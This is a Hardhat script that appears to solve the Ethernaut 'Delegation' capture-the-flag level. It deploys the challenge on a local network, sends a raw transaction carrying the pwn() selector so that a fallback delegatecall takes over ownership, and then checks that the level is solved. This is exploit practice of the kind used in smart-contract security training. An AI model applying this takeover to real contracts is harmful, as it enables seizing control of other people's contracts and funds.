const { hexDataSlice, id } = require('ethers/lib/utils');
const { ethers } = require('hardhat');

async function main() {
  const [owner, player] = await ethers.getSigners();

  console.log("\n[0] original owner: ", owner.address);
  console.log("[0] player: ", player.address);

  console.log("\n[1] deploy DelegationFactory");
  const Factory = await ethers.getContractFactory("DelegationFactory");
  const factory = await Factory.connect(owner).deploy();
  await factory.deployed();
  console.log("---- DelegationFactory address: ", factory.address);

  console.log("\n[2] create a Delegation instance");
  const receipt = await factory.connect(player).createInstance(player.address);
  const instance_address = (await receipt.wait()).events[0].args[0];
  const delegation = await ethers.getContractAt("Delegation", instance_address, owner);
  console.log("---- Delegation address: ", delegation.address);

  console.log("\n[3] call pwn() via delegationCall");
  const func_selector = hexDataSlice(id("pwn()"), 0, 4);

  const tx = {
    to: delegation.address,
    data: func_selector,
    gasLimit: 50000,
  }

  console.log("---- function selector:", func_selector);
  console.log("---- sending tx:", tx);

  await player.sendTransaction(tx);

  console.log("\n[4] validate solved");
  const res = await factory.validateInstance(delegation.address, player.address);

  if (res == true) {
    console.log("[+] Done!");
  } else {
    console.log("[+] Fail...");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

